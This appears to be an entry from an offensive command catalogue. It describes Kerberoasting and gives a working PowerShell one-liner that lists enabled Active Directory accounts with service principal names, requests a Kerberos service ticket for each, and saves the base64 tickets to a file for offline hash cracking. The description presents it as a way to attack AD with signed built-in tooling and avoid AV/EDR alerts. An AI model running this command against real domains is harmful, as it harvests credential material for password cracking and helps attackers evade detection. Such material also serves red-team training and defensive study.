---
description: |
  Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and then attempting to crack those hashes offline. 
  This one liner using the powershell AD module serves less as a feasiable attack and more as a PoC that the AD module with some ingenuity
  can be used to exploit many vectors within AD that you otherwise import tools that are not signed, need obfiscation, require AV/EDR bypass or other
  steps that may trigger alerts.

command: |
  Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output "===== $account : $spn =====`n$ticketBase64" } | Out-File -FilePath "kerberos_tickets.txt" -Encoding ASCII

items:
  - powershell
services:
  - Kerberos
OS:
  - Windows

attack_types:
  - Exploitation
references:
  - https://github.com/samratashok/ADModule

---
